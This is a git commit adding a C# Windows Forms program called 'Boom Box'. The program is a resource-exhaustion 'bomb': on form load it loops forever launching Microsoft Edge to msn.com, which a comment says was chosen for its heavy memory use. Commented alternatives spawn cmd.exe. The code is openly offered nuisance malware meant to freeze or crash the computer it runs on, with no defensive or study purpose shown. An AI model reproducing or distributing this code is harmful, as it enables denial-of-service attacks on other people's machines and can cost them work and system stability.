f641186a2d8229b785ed6c1506b0dd0edb59bd55
theProgrammer57 <140911501+theProgrammer57@users.noreply.github.com>
2023-09-10 02:48:15 +0900

    Add files via upload

---
+++ Boom Box/Form1.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+
+namespace Boom_Box
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            while (true)
+            {
+                Process.Start("microsoftedge.exe", "msn.com");
+                //we use msn.com because they need lots of memory sources
+
+                //you can use this also
+                //Process.Start("microsoftedge.exe");
+                //Process.Start("cmd.exe");
+            }
+        }
+    }
+}
